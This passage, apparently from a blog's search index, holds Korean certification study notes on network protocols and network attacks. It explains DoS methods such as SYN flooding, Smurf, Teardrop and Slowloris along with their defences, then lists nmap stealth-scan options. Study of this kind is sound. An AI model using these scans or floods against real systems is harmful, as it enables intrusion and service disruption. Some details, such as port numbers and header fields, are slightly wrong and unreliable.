공유해야 하고 라우터 브로드캐스트를 통해서 공유함           OSPF, EIGRP(애매함)                       Path Vector                    Distance Vector 와 Link State 의 Hybrid 형태           Hop count 및 Bandwidth, Delay 등의 다양한 정보로 경로를 설정           정책기반으로 라우팅 정보 업데이트           BGP                           스패닝 트리(Spanning Tree)            스위치나 브리지에서 발생하는 루핑을 막는 프로토콜       출발지부터 목적지까지의 경로가 두 개 이상 있는 경우 한 개의 경로만 남겨두고 나머지 경로는 끊어서 루핑을 방지           2. RIP (Routing Information Protocol)                  구분       내용                       개념       RFC 1058에 정의되어 있고 대표적인 거리 벡터 라우팅 프로토콜                 동작 원리       ⦁ 라우터 간 거리 계산을 위한 척도로 홉수(Hop count) 사용 ⦁ 16Hop 이상이면 패킷을 폐기 ⦁ 180초 이내에 새로운 라우팅 정보가 수신되지 않으면 해당 경로를 이상 상태로 간주 ⦁ 수신된 목적지의 거리 값과 현재 거리 값을 비교하여 작을 것을 기준으로 라우팅 테이블을 변경                 라우팅 정보       라우팅 정보 변경 시 모든 망에 적용하므로 큰 규모의 망에는 적합하지 않음           3. OSPF (Open Shortest Path First)                  구분       내용                       개념 및 특징       ⦁ RFC 1247에 정의되어 있는 IP 라우팅 프로토콜 ⦁ 대규모 IP 망에서 사용되며 Link State Routing Protocol ⦁ 링크에서의 전송 시간을 링크 비용으로 사용하여 각 목적지별 최단경로를 구함 ⦁ 네트워크에 변화가 발생했을 때 상대적으로 짧고 간단한 링크 상태 정보를 교환                 동작 원리       ⦁ Link의 delay, throughput, reliability 를 이용하여 기본적은 throughput 만 이용하고, Hop 수에 대한 제약이 없음 ⦁ 네트워크를 Area로 구분하여 많은 라우팅 정보의 교환으로 인한 라우터의 성능저하를 예방. 대역폭을 절약함 ⦁ Link 변화 감지 시 해당 Link에 대한 정보만을 즉시 모든 라우터에 전달하여 Convergence가 매우 빠름 ⦁ Supernetting 된 형태로 Routing Information 을 전달할 수 있어 라우터 메모리 절약, 상능 향상 및 대역폭 절약 가능                   OSPF의 동작 원리 구성도의 예          이미지 출처             ABR (Area Border Router, 영역 경계 라우터) : Area에 백본망을 연결해주는 라우터       ASBR (Autonomous System Boundary Router, 자율 시스템 경계 라우터) : 다른 AS(Autonomous System)에 속한 라우터와 경로정보 교환       IR (Internal Router, 내부 라우터) : Area에 접속한 라우터       BR (Backbone Router, 백본 라우터) : 백본망에 접속한 모든 라우터           4. BGP (Border Gateway Protocol)                  구분       내용                       개념       AS(Autonomous System) 상호 간의 routing 에 적용되는 routing protocol 로 ISP(Internet Service Provider) 사업자들 상호 간에 주로 사용되는 routing protocol                 특징       ⦁ EGP라고 하는 Inter-domain routing protocol ⦁ 인터넷을 AS 상호 간 연결 Path로 이뤄진 방향성 그래프의 집단으로 인식 : 경로 벡터 라우팅(path vector routing) 방법을 적용하며, 경로 벡터 라우팅 테이블을 유지 ⦁ Looping free routing ⦁ TCP 기반 routing : BGP 라우팅 정보는 router 간에 179번 포트를 통하여 TCP에 의해 신뢰성 있게 전달 ⦁ Routing 정보의 점진적 갱신 : BGP 는 주기적으로 라우팅 정보를 갱신하지 않고, 변화가 있을 때 neighbor router에게 갱신 정보를 advertising 함 ⦁ 다양한 routing metric 사용 : 최상위 경로 선택을 위해 우선순위가 있는 각 metric을 참조 ⦁ Class 없는 주소체계 지원 : CIDR(Classless Inter-Domain Routing) 지원 ⦁ IBGP(Internal BGP) : 동일한 AS에 속한 BGP 라우터 간의 동작 ⦁ EBGP(External BGP) : 서로 다른 AS에서 동작하는 BGP 프로토콜           2. IP(Internet Protocol)   1.개념     TCP/IP 의 네트워크 계층(IP계층) 은 주소화, 데이터그램 포맷, 패킷 핸들링 등을 정의해놓은 인터넷 규약이다.   IPv4 : 32비트 주소체계를 사용하고 있고 이러한 주소체계는 네트워크 ID와 호스트 ID로 구분된다.   IPv6 : IP 주소의 부족 문제를 해결하기 위해서 주소 비트 수를 128비트로 늘린 것        네트워크 계층 구조          이미지 출처       IP Header 구조            Version : IPv4 버전       Header Length : Header의 전체 길이       Type of Service : 서비스 유형       Total Length : IP Datagram의 byte 수       Identification : Host에서 보낸 Datagram 식별       Flags &amp; Offset : IP Datagram 단편화 정보                    MTU(Maximum Transmission Unit) : 네트워크 상 한 번에 통과할 수 있는 패킷의 최대 크기           패킷의 크기가 너무 크면  (MTU 보다 크면) 분할되고, 패킷이 분할된 경우 패킷 수신자가 다시 조립을 해야 하는데 이와 관계된 정보                       Time to Live(TTL) : Datagram이 통과할 수 있는 라우터 수                    0이 되면 자동 폐기                       Protocol : ICMP, TCP, UDP                    IP Header 위의 상위 프로토콜의 종류                       Header Checksum : IP Header Checksum 계산                    Header 의 무결성을 검사하기 위함                           IPv4의 단편화(Fragmentation) 와 재결합(Reassembly)            ifconfig 로 MTU 확인 (1500 = 국제표준)           IP 주소의 구조            클래스(Class)                    클래스의구조 / 네트워크ID / 호스트ID           네트워크 ID : 네트워크에 부여될 수 있는 것           호스트 ID : 하나의 네트워크에 부여될 수 있는 호스트 IP 주소 자릿수                                클래스(Class) 구조                                                  Class               Message                                                               Class A               ⦁ 첫 바이트 7Bit가 네트워크 식별자 ⦁ 한 네트워크에 가장 많은 호스트를 가짐 ⦁ 최상위 비트 0                                         Class B               ⦁ 14Bit의 네트워크 식별자 ⦁ 한 네트워크에 약 2^16대의 호스트 수용 ⦁ 최상위 비트 10                                         Class C               ⦁ 세 번째 바이트까지 네트워크 식별자 ⦁ 한 네트워크에 254대까지 수용 ⦁ 최상위 비트 110                                         Class D               멀티캐스트 주소로 사용  ⦁ 최상위 비트 1110                                               서브넷팅(Subnetting)                    주어진 네트워크 주소를 작게 나누어 여러 개의 서브넷(논리적)으로 구성           네트워크 식별자 부분을 구분하기 위한 mask를 서브넷 마스크(Subnet Mask)라고 함           예) 1.0.0.1 / 24 : 서브넷마스크를 2진수 표현 시 1의 개수(CIDR 표기법)                        예) 255.255.255.192/26 : 4개의 네트워크, 네트워크당 IP 64개                                                                  클래스 종류                   네트워크 ID                                                           호스트 ID                                                                                   일반적인 Class C                   11111111                   11111111                   11111111                   00000000                                                     subnet mask                   255                   255                   255                   0                                                     2비트를 사용하여 서브넷팅                   11111111                   11111111                   11111111                   11000000                                                     subnet mask                   255                   255                   255                   192                                                                               수퍼넷팅(Supernetting) : ISP 사업자가 많은 네트워크 망을 관리하기 위해 묶은 것       VLSM(Variable Length Subnet Mask) :서로 다른 크기의 Subnet을 지원, 필요한 호스트의 수가 많은 Subnet을 먼저 계산       CIDR : IP 주소와 서브넷 마스크를 이진 표기법으로 표현하여 기존의 고정크기 네트워크를 다양하고 세부적으로 분할. 기존 클래스 A,B,C 네트워크 주소의 개념을 무시 (IPv4 주소 공간의 효율적 할당)           2. ICMP (Internet Control Message Protocol)     TCP/IP 에서 오류 제어 프로토콜   호스트 및 라우터는 다른 호스트나 라우터가 현재 도달 가능한지 여부를 결정함   라우터는 특정 목적지 네트워크로 후속 IP 데이터그램을 보냈는데, 사용할 수 있는 더 좋은 경로가 있을 때 근원지 호스트에게 통지함.   호스트나 라우터는 그들이 처리하기에 너무 빠른 IP 데이터그램이 도착하면 다른 시스템에게 통보함.   ICMP 주요 기능            오류 보고 메시지 : IP 패킷 처리 도중 발견된 문제를 보고       질의 메시지 : 다른 호스트로부터 특정 정보를 획득하기 위해 사용           ICMP 메시지 구조            Type : ICMP 메시지 유형 표시       Code : Type과 같이 사용되며 세부적인 유형을 표현       Checksum : IP Datagram Checksum                ICMP 메시지                                  Type           Message           설명                                           3           Destination unreachable           Router가 목적지를 찾지 못할 경우 보내는 메시지                             4           Source quench           패킷을 너무 빨리 보내 Network에 무리를 주는 호스트를 제지할 떄 사용                             5           Redirection           패킷 Routing 경로를 수정, Smurf 공격에서 사용                             8 or 0           Echo request or reply           Host의 존재를 확인                             11           Time exceeded           패킷을 보냈으나 시간이 경과하여 Packet이 삭제되었을 때 보내는 메시지                             12           Parameter problem           IP Header field에 잘못된 정보가 있다는 것을 알림                             13 or 14           Timestamp request and reply           Echo와 비슷하나 시간에 대한 정보 추가                           ping 명령어 실행            윈도우 기본 TTL : 128       리눅스 기본 TTL : 64           3. 데이터 전송 방식과 멀티캐스트           데이터 전송방식                                  전송방식           내용                                           Unicast           1:1 전송 방식                             Broadcast (IPv4)           1:N 전송방식 (동일한 서브넷 상의 모든 수신자에게 전송)                             Multicast           M:N 전송방식 (하나 이상의 송신자들이 특정 그룹의 수신자에게 전송)                             Anycast (IPv6)           그룹에 등록된 노드 중에서 최단 경로 노드 한개에만 전송                           4. 멀티캐스트와 IGMP (Internet Group Management Protocol)     멀티캐스트는 그룹에 등록된 사용자에게만 데이터를 전송하는 것   IGMP 는 그룹에 등록된 사용자를 관리하는 프로토콜        IGMP 메시지 구조              14bytes20bytes8bytes       이더넷 헤더IP 헤더IGMP 메시지       Version(=0)Type(=1-2)(unused)Checksum       32bit 클래스 D 주소                8Byte 구성       Version : IGMP 프로토콜의 버전 표시, 현재 IGMP Version 2       Type : 메시지 유형, 1 = 보고, 2 = 질의메시지       Group id                    보고 메시지 : 호스트에서 신규 가입하고자 하는 멀티캐스트 서비스 group id / 계속 받아보기를 원하는 멀티캐스트 서비스의 group id           질의 메시지 : 0                           5. ARP (Address Resolution Protocol)     IP 주소를 물리적 하드웨어 주소인 MAC 주소로 변경하는 프로토콜   ARP Request를 보내고 인접에 있는 컴퓨터가 ARP Reply 로 응답한 것을 통해서 ARP Cache Table을 유지한 후 인접 컴퓨터의 IP 주소와 MAC 주소를 가지고 있게 됨   ARP Cache Table : MAC 주소와 IP 주소 매핑 테이블   ARP Operation Code (1-9)            1 : ARP Request       2 : ARP Reply       3 : RARP Request       4 : RARP Reply           arp : 리눅스에서 ARP Cache Table 확인   arp -a : 윈도우에서 ARP Cache Table 확인   6. RARP (Reverse Address Resolution Protocol)     물리적인 주소 MAC을 기반으로 논리적인 주소 IP를 알아오는 프로토콜   하나의 호스트를 RARP 서버로 지정   디스크 없는 워크스테이션은 RARP Request 패킷을 전송 (브로드캐스트)   RARP 서버는 인터넷 주소를 RARP Response 패킷으로 응답 (유니캐스트)   3. 네트워크 접근(Network Access) 계층   1. 네트워크 접근(Network Access) 계층     논리적 주소인 IP 주소를 물리적 MAC 주소로 변환   Physical Layer 가 이해할 수 있는 헤더를 붙여주는 Layer   Frame 단위, Mac Adress를 사용하는 계층   통신기기 사이의 연결, 데이터 전송 기능   에러제어, 흐름 제어   OSI 7 계층의 데이터 링크 및 물리 계층에 해당   2. 네트워크 접근 주요 기능     Point-to-Point 간 신뢰성 있는 전송으로 흐름 제어(Flow Control) 담당   에러 제어(Error Control) : Error Detection(에러검출), Error Correction(에러정정)   MAC(Media Access Control) : Lan 카드의 물리적 주소   Frame 으로 변환   3. CSMA/CD (Carrier Sense Multiple Access/Collision Detection)     유선 LAN(Local Area Network) 에서 메시지를 송수신하기 위한 접근 방법   충돌이 발생하지 않는 경우            전송을 원하는 호스트는 네트워크에 캐리어를 감지해 전송이 가능한지 검사 (데이터 프레임 전송)       발생한 프레임은 네트워크 내에서 Broadcast 됨       다른 호스트는 목적지 IP 주소가 자기가 아니라는 것을 알면 프레임을 바로 폐기       목적지 호스트는 전송 호스트에게 Unicast 로 응답 (Shared Device Hub 네트워크에서는 유니캐스트와 브로드캐스트의 차이가 없음)           충돌이 발생한 경우            각각의 호스트에서 발생한 프레임이 공유 매체에서 Collision을 발생시킴       Collision 이 발생되면 Jam Signal을 모든 호스트로 전송       JamSignal을 받은 호스트들은 일정 시간 후에 다시 전송을 시작 (Back off 알고리즘을 이용하여 재전송)       리피터와 허브를 이용하면 Collision이 발생하지만, Switch 는 Collision을 막을 수 있음.       Switch는 브로드캐스트를 막을 수 없고, Router 가 브로드캐스트를 막을 수 있음.           4. CSMA/CA (Carrier Sense Multiple Access/Collision Avoidance)     무선 LAN(Local Area Network) 에서 메시지를 송수신하기 위한 접근 방법   프레임 전송 이전에 제어 메시지를 이용하여 수신자로부터 간단한 전송을 유발   제어 신호에 대한 응답이 도착하면 프레임을 전송   5. LAN Switch                  LAN Swtich 방식       설명                       Cut through       목적지의 MAC Address만 확인 후 해당 포트로 전송                 Store and Forward       전채 Frame을 모두 저장하여 Error Check를 수행 후 전송                 Fragment Free       ⦁ Modify Cut Through ⦁ Frame의 64 Bit를 검사, Header의 Error를 검사 후 전송 ⦁ 512Bit가 수신 될 때까지 대기 후 에러가 존재하지 않으면 전송하는 방식           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크 보안","네트워크 개념"],
        "url": "https://bluesplatter.com/is_certification/ISCert-02Network-01Network/",
        "teaser": null
      },{
        "title": "02.네트워크 보안 - 02.네트워크 공격기법",
        "excerpt":"서비스 거부 공격(DoS : Denial of Service)     특정 서비스를 계속적으로 호출하여 CPU, Memory, Network 자원을 고갈시킴   1. 공격 방식     소프트웨어 취약점을 이용   IP Header를 변조하는 로직 공격   무작위로 패킷을 발생시키는 플러딩 공격   DDoS(Distributed Denial of Service) 공격은 여러 대의 공격자 서버가 분산되어 있고 특정 시스템을 집중적으로 공격하는 방법   2. Dos 및 DDoS 공격 도구                  도구       Trinoo       TFN       Stacheldraht                       공격방법       UDP Flood       UDP, ICMP, SYN Flood, Smurf       UDP, ICMP, SYN Flood, Smurf                 암호 기능       없음       없음       가능                 Attacker&lt;-&gt;Master       27665/tcp       Telnet 등 방법(별도의 연결 없음)       1660/tcp(암호화)                 Master&lt;-&gt;Agent       27444/udp       ICMP echo Reply       ICMP echo Reply, 65000/tcp                 Agent&lt;-&gt;Master       313335/udp       ICMP echo Reply       ICMP echo Reply           분산 서비스 거부 공격(DDoS)   1. TCP SYN Flooding   1. 공격방법     TCP 패킷의 SYN 비트를 이용한 공격 방법으로 많은 연결 요청을 전송해서 대상 시스템이 Flooding(범람)하게 만들어 서비스를 중단시키는 공격   Hacker가 의미없는 발신주소로 변조한 TCP SYN packet 를 Victim에게 전송   Victim은 의미없는 발신주소에게 TCP SYN/ACK packet 전송   대상이 없기 때문에 ACK packet 은 돌아오지 않음   Victim의 TCP 연결 대기 큐가 overflow 될 때까지 Hacker가 계속 연결 요청   2. 대응 방법                  대응책       내용                       방화벽에서 대응       IP당 SYN 요청에 대한 PPS(Packet Per Second) 임계치를 단계적으로 조정                 First SYN Drop(Spoofed) 설정       ⦁ SYN 패킷을 보낸 클라이언트의 존재 여부를 파악하여 차단하는 방법 ⦁ 클라이언트에서 전송된 첫 번째 SYN을 DROP하여 재요청 여부를 확인 후 Spoofing 여부를 판단함                 TCP 세션 연결 차단       트래픽 유형별 임계치를 조정하여 TCP 세션 연결에 대한 차단                 Back queue 증가       ⦁ 임시적 방법으로 서버의 Queue 사이즈를 증가시킴 ⦁ sysctl -w net.ipv4.tcp_max_syn_backlog = 1024                 L4/방화벽 SYN cookies 설정       ⦁ L4/방화벽은 ACK에 필요한 Seq값을 인코딩하여 같이 전달하고 잊어버림 ⦁ sysctl -w net.ipv4.tcp_syncookies=1              netstat 명령으로 TCP SYN Flooding 공격을 확인할 때 Source IP 주소가 변조되어 있을 수 있으므로 ISP 사업자와 협조를 통해서 IP를 추적해야 한다.        라우터(Router) 에서 대응 방법                                  구분           내용                                           Watch Mode           SYN 패킷을 통과시키고 일정 시간 동안 연결이 이루어지지 않으면 라우터가 SYN 패킷을 차단함                             Intercept Mode           라우터에 유입되는 SYN 패킷 요청을 서버로 전송하지 않고, 라우터에서 가로채어 SYN 패킷을 요청한 클라이언트와 서버를 대신 연결하는 것                           2. DRDoS     공격방법            별도의 Agent를 설치하지 않고 TCP Half Open의 취약점을 이용하는 공격기법       Victim IP로 출발지 IP를 변조하여 반사서버 (정상 TCP 서버 또는 라우터) 에 SYN packet 전송       서버들은 변조된 공격대상 IP 로 SYN/ACK packet 전송           3. ICMP Flooding   1. 개요     IP특징(Broadcast 주소 방식)과 ICMP 패킷을 이용한 공격 방법   통신을 위해 서비스 및 포트가 필요 없는 유일한 프로토콜   Smurfing Attack 이라고도 함.   2. 공격 방법     공격자는 다수의 호스트가 존재하는 서브 네트워크에 변조된 ICMP Echo 패킷을 Broadcast 전송 (Source IP를 피해자의 IP로 변조함)   다량의 응답 패킷이 공격대상 서버로 집중됨   3. ICMP 공격에 사용되는 메시지                  메시지       내용                       Source Quench(Type-4)       사용 중 전송자에게 패킷 전송 속도를 줄여 줄 것을 요구하는 메시지로 전송 속도의 지연 발생                 Time to live exceeded in Transit (Type-11, Code-0)       시간 초과로 패킷이 폐기되었기 때문에 재전송함                 Destination unreachable (Type-3, Code-0,1,2,3)       ICMP 트래픽 처리에 자원을 사용하게 되므로 시스템이 조금씩 느려지는 현상 발생           4. ICMP 및 UDP Flooding 대응 방법                  대응 방법       내용                       ACL(Access Control List)을 이용한 차단       웹 서버 혹은 운영 장비에 대한 접근 제어목록을 이용해 차단                 Inbound 패킷 임계치 설정       ⦁ 운영 장비로 유입되는 Inbound 패킷을 기준으로 PPS 수치를 유입되는 수치보다 낮게 설정 ⦁ 임계치 이상의 ICMP 및 UDP를 차단           4. Tear Drop : IP Fragmentation (Ping of Death)   1. 개요     네트워크 패킷은 MTU(Maximum Transmission Unit)보다 큰 패킷이 오면 분할(Fragmentation)하고 분할 된 정보를 flags와 offset이 가지고 있다.   이 때 offset을 임의로 조작하여 다시 조립될 수 없도록 하는 공격   Fragment를 조작하여 패킷 필터링 장비나 IDS를 우회하여 서비스 거부 공격을 유발   2. Tear drop 공격 종류                  종류       설명                       Tiny Fragment       최초의 Fragment를 아주 작게 만들어서 네트워크 침입탐지 시스템이나 패킷 필터링 장비를 우회하는 공격                 Fragment Overlap       ⦁ Tiny Fragment 공격 기법에 비해 더욱 정교한 방법 ⦁ IDS의 Fragment 처리 방법과 패킷 필터링의 재조합과 Overwrite 처리를 이용                 IP Fragmentation을 이용한  서비스 거부 공격       ⦁ Ping of Death : Ping을 이용하여 ICMP 패킷을 규정된 길이 이상으로 큰 IP 패킷을 전송, 수신 받은 OS에서 처리하지 못함으로써 시스템을 마비시키는 공격 ⦁ Tear Drop : fragment 재조합 과정의 취약점을 이용한 공격으로 목표시스템 정지나 재부팅을 유발하는 공격. TCP Header 부분의 offset field 값이 중첩되는 데이터 패킷을 대상 시스템에 전송 ⦁ Targra Attack : 작업 중에 저장 되지 않는 데이터를 모두 삭제하는 공격방법. IP 단편화가 발생하면, 수신자는 재 조립시에 정확한 조립을 위하여 오프셋을 더하게 되는데, 이 때 더 큰 오프셋을 더해서 오버플로우를 발생시키는 공격 방법. New Tear, Nestea Attack           3. Ping of Death 공격 방법     하나의 큰 패킷을 전송하면 패킷은 MTU(Maximun Transmission Unit)의 크기를 넘을 수 없기 때문에 분할되어서 응답을 받음   5000 Byte 의 패킷을 보냈을 경우 1500 MTU의 네트워크 환경에서 offset:0 1500 bytes, offset 1480 1500 bytes, offset 2960 1500 bytes, offset 4440, 580 bytes   4. Land Attack     개요            송신자와 수신자의 IP 주소와 Port 주소를 동일하게 설정하여 네트워크 장비에 부하를 일으킴           공격 방법            IP Header를 변조, 송신자 IP 주소 및 Port 주소를 수신자(희생자)의 IP 주소와 Port 주소로 설정하여 트래픽을 전송           대응 방법            송신자와 수신자의 IP 주소가 동일한 패킷을 삭제           5. HTTP Get Flooding     개요            정상적인 TCP 연결 이후 정상적으로 보이는 HTTP Transaction 과정을 수행하는 Dos/DDos 공격 방법       HTTP Get을 지속적으로 요청하여 HTTP 연결 및 HTTP 처리 로직의 과부하를 유발       TCP 3-Way Handshaking 이후 공격을 수행하기에 IP를 변조하지 않음                대응 방법                                  대응 방법           내용                                           선별적 IP 차단           ⦁ TCP 연결요청 임계치 값과 HTTP Get의 임계치 값을 모니터링한 후 비정상적인 트래픽은 차단함 ⦁ 연결기반 공격이므로 IP를 변조할 수 없는 특성을 이용                             컨텐츠 요청횟수에 의한 임계치 설정           특정 컨텐츠를 다량으로 요청하는 것이므로 IP마다 컨텐츠 요청 횟수의 임계치를 설정                             시간대별 웹 페이지 URL 접속 임계치 설정 차단           시간대별 임계치를 설정하여 임의의 시간 안에 설정한 임계치 이상의 요청이 들어온 경우 해당 IP를 탐지하여 방화벽 차단 목록에 등록                             Web Scraping 기법을 이용한 차단           L7 스위치를 운영하는 경우 웹 스크래핑 기능을 사용하여 요청 패킷에 대한 쿠키 값이나 자바 스크립트를 보내어 클라이언트로부터 원하는 값에 재요청 패킷이 없는 경우 해당 패킷을 차단                           탐지            ngrep -l Serverl.pcap -twbyline | grep GET | sort | uniq -c | sort -rn           6. Cache Control     개요            no cache : 임시 인터넷 파일의 저장된 페이지 새 버전 확인을 웹 페이지를 열때마다 로 설정           Cache Control Attack 공격 방법            Cache-Control Header 옵션 값을 사용       no-cache 로 설정하면 항상 최신의 페이지를 요청하여 부하를 발생시킴       웹 서버 호출           대응 방법            임계치 기반 대응을 실시           7. Slow HTTP Get/Post Attack   1. Slow HTTP Get 방식     TCP/UDP 기반 공격 : 변조 IP가 아닌 정상 IP 기반 공격, 탐지 어려움   소량의 트래픽을 사용한 공격 : 소량의 트래픽과 세션 연결을 통해서 공격   애플리케이션 대상 : 서비스의 취약점을 이용한 공격   2. Slow HTTP Post 방식     HTTP의 Post 지시자를 사용하여 서버에게 전달할 대량의 데이터를 장시간에 걸쳐 분할 전송   Post 데이터가 모두 수신되지 않으면 연결을 장시간 유지   공격 방법            HTTP Header의 Content-Length 필드에 임의의 큰 값을 입력       공격자는 소량의 데이터를 느린 속도로 전송하여 장기간 동안 세션을 유지           3. Slow HTTP Get/Post 공격 대응 방법                  대응 방법       내용                       접속 임계치 설정       특정 발신지에서 IP로 연결할 수 있는 최대값 설정                 방화벽 설정 도구인 iptables로 차단       ⦁ iptables -A INPUT -p tcp -dport 80 -m connlimit-above 30 -j DROP ⦁ 30개 이상의 Concurrent Connection 에 대한 차단                 Connection Timeout과 Keepalivetime 설정       ⦁ Connection Timeout 설정으로 클라이언트와 서버 간에 데이터 전송이 없을 경우 연결 종료 ⦁ 웹 서버의 Keepalivetime을 설정하여 차단                 RequestReadTimeout 설정으로 차단       ⦁ Apache 2.2.15버전 이후에서 사용 ⦁ Slow Attack를 차단하기 위해서 RequestReadTimeout header=5 body=8 설정 ⦁ 5초 내에 연결이 안 되면 연결 종료, POST 요청 이후 8초 내에 데이터가 오지 않으면 연결 종료                 그 외       ⦁ POST 메시지의 크기를 제한(POST_MAX_SIZE) 한다. ⦁ 최저 데이터 전송 속도를 제한한다. ⦁ TCP 상태를 모니터링한다.           4. Slow HTTP Read DoS     공격자가 웹 서버와 TCP 연결 시 TCP 윈도우 크기 및 데이터 처리율을 감소시킨 후 HTTP 데이터를 송신하여 웹 서버가 정상적으로 응답하지 못하도록 하는 Dos/DDoS 기법   TCP 윈도우 크기 및 데이터 처리율을 감소시키면 서버는 정상상태로 회복될 때까지 대기상태에 빠지게 되어 부하를 유발함   공격 방법            공격자는 자신의 TCP 윈도우 크기를 0Byte로 만든 후 서버로 전달       서버는 윈도우 크기가 0 Byte인 것을 확인하고 데이터를 전송하지 않고 Pending 상태를 유지함       공격자는 윈도우 크기를 점검하는 Probe 패킷을 ACK로 전송하여 서버는 대기 상태로 빠지게 됨           5. Slow HTTP Header DoS(Slowloris)     HTTP Header 를 비정상적으로 조작해서 웹 서버가 헤더 정보를 구분할 수 없도록 하는 방법   웹 서버에 HTTP Header 정보가 모두 전달되지 않은 것으로 판단하여 연결을 장시간 유지   웹 서버는 클라이언트로부터 요청이 끝나지않은 것으로 판단하기 때문에 웹 로그에 기록하지 않음   공격 방법            HTTP Header 와 Body 는 개행문자 (\\r\\n\\r\\n) 로 구분됨.       Slow HTTP Header DoS 는 \\r\\n 만 전송하여 불완전 Header 를 전송           8. Hash DoS   1. 개요     클라이언트에서 전달되는 각종 파라미터 값을 관리하는 해시테이블의 인덱스 정보가 중복되도록 유도 -&gt; 사전에 저장된 정보 조회 시 많은 CPU 자원을 소모하도록 하는 공격   HTTP Request 요청 시 Get, Post 방식으로 전송되는 변수를 Hash 구조로 관리함. (Get 방식은 길이에 제한이 있으나 Post 전송 방식은 파라미터 개수의 제한이 없음)   많은 수의 매개변수를 전달하면 매개변수를 저장하는 해시테이블에서 해시 충돌이 발생하여 해시테이블에 접근하는 시간이 증가함.   동일한 Hash Bucket 에 element 가 삽입될 경우 Hash Table은 이를 Linked List 로 구성하게 되는데 이 때 O(n^2) 의 시간이 소요됨.   해시충돌(Hash Collision)            서로 다른 키 값이 같은 인덱스 값으로 매핑되는 현상           2. Hash DoS 대응방안                  대응 방법       내용                       HTTP Post 파라미터 수 제한       TOMCAT,PHP,Ruby 등의 최신 버전은 파라미터의 수를 제한할 수 있음. 즉, 개수 제한을 적용 예)tomcat 은 TOMCAT_HOME/conf/server.xml 에 maxParameterCount = “XX”                 Post 메시지 크기 제한       POST 메시지의 사이즈를 제한하는 서비스 설정 예)tomcat 의 TOMCAT_HOME/conf/server.xml 에 MaxPostSize = “XX”                 PHP에서 Hash DoS 차단       php.ini 파일에서 max_input_var 로 최대 HTTP POST Parameter 개수 설정           10. Hulk DoS   1. 개요     웹 서버의 가용량을 모두 사용하여 정상적인 서비스가 불가능하도록 하는 Get Flooding 의 공격 유형이다.   공격 대상 URL을 지속적으로 변경하여 DDoS 차단정책을 우회하는 특성을 가진다.   특정 URL이 계속 변경되면 임계치 설정 기반 방어가 불가능하게 된다. 즉, 임계치는 고정된 URL에만 설정이 가능하다는 특성을 이용, 우회한다.   2. 대응 방안                  대응 방안       내용                       접속 임계치 설정을 통한 차단       발신 IP에서 연결할 수 있는 동시 접속 수에 대한 최댓값을 설정하여 한 개의 IP에서 대량의 연결 시도를 차단 iptables -A INPUT -p tcp -dport 80 -m connlimit-above 30 -j DROP # 30개 이상의 Concurrent Connection에 대한 차단                 HTTP Request HOST 필드 값에 대한 임계치 설정을 통한 차단       Hulk DoS는 URL을 계속 변경하기 때문에 URL이 아닌 HTTP Request에 포함된 HOST 필드 값을 카운트하여 임계치 이상인 경우 차단함                 302-Redirect를 이용한 차단       ⦁ 대부분의 DDoS 공격 툴은 302-Redirect 요청에 대해 반응하지 않는 것이 특징임 ⦁ URL 중에서 공격 당하기 쉬운 웹 사이트에 대한 Redirect 처리를 통해서 자동화된 DDoS 공격 툴을 이용한 공격을 사전에 차단           스캐닝   1. 포트 스캐닝(Port Scanning)   1. 개요     포트 스캐닝은 서버에 열려 있는 포트를 확인하기 위한 방법으로 NMAP 이라는 도구를 사용해서 스캐닝을 수행한다.   포트 스캐닝을 사용하면 서버에 열려 있는 포트를 확인하고 해당 포트의 취약점을 이용하여 공격할 수 있다.        NMAP 포트 스캐닝                                  NMAP Port Scan           설명                                           TCP connect() Scan           3-Way Handshaking 를 수립하고 Target System 에서 쉽게 탐지가 가능하다.                             TCP SYN Scan           ⦁ SYN 패킷을 대상 포트로 발송하여 SYN/ACK 패킷을 수신 받으면 Open 상태이다. ⦁ SYN 패킷을 대상 포트로 발송하여 RST/ACK을 수신 받으면 Close 상태이다. ⦁ Half Open 또는 Stealth Scan이라고 한다.                             TCP FIN Scan           ⦁ 대상 포트로 FIN 패킷을 전송하고 닫혀 있는 포트는 RST를 전송한다. ⦁ 포트가 개방되어 있으면 패킷을 무시한다.                             TCP Null Scan           ⦁ 모든 플래그를 지운다. ⦁ 대상 포트가 닫혀 있으면 RST를 돌려보내고 개방 상태이면 패킷을 무시한다.                             TCP X-MAS Tree Scan           ⦁ 대상 포트로 FIN, URG, PSH 패킷을 전송한다. ⦁ 대상 시스템에서 포트가 닫혀 있으면 RST를 되돌려 보낸다. ⦁ 포트가 개방되어 있으면 패킷을 무시한다.                                  nmap -O : TTL 값을 사용해서 해당 시스템의 운영체제를 식별하기 위함           2. 포트 스캐닝 기법   1. NMAP 옵션     SCAN Type            -sS : TCP SYN Scan       -sT : TCP Connection Scan       -sU : UDP Scan       -sF : TCP FIN Scan       -sX : TCP Xmas Scan       -sN : TCP NULL Scan       -sA : TCP ACK Scan       -sW : TCP Windows Scan       -sM : TCP Maimon Scan       -sI : TCP IDLE Scan       -sO : IP Protocol Scan       -b : FTP Bounce Scan           Port Option            -p # : 특정 포트번호만 검색       -p ssh : 특정 이름의 포트만 검색       -p 1,2,3 : 여러 개의 특정 포트만 검색       -p 1-1023 : 특점 범위의 포트만 검색       -p -1023 : 처음부터 특정 범위까지 포트만 검색       -p 49152- : 특정 포트부터 끝까지 검색       -p- : 0번을 제외한 모든 포트 검색       -pT:1,2,U:1,2  : T는 TCP 포트 U는 UDP 포트를 의미       -p http : http라는 이름을 가진 모든 포트를 스캔           2. NMAP 포트 스캐닝     UDP SCAN            공격자는 UDP Packet을 전송해서 스캐닝하는 것으로 UDP 특성상 신뢰성이 떨어짐                    Port Open : UDP Packet -&gt; 응답 X           Port Close : UDP Packet -&gt; ICMP Unreachable                           TCP Open Scan            공격자는 TCP의 3-Way handshaking 과정을 진행해서 오픈된 포트를 확인       서버에 로그가 기록되고 스캔 속도가 느림                    Port Open : SYN -&gt; SYN+ACK -&gt; ACK           Port Close : SYN -&gt; RST+ACK                           Stealth Scan            스캔하는 대상에 로그를 남기지 않는 스캐닝 기법                    TCP Half Open Scan           FIN Scan           Xmas Scan           Null Scan                       로그가 남지 않음                    Port Open : 응답 X           Port Close : RST                           TCP Half Open Scan            TCP 연결 시에 SYN 패킷만 전송하고 응답 정보로 포트 오픈을 확인       완전한 세션을 성립하지 않고 포트의 활성화를 확인, 로그가 남지 않음                    Port Open : SYN -&gt; SYN+ACK -&gt; RST           Port Close : SYN -&gt; RST+ACK                           FIN Scan            TCP에서 FIN은 연결 종료를 의미                    Port Open : FIN -&gt; 응답 X           Port Close : FIN -&gt; RST                           X-MAS Scan            공격자는 TCP FIN, PSH, URG Packet 전송하여 포트 오픈을 확인                    Port Open 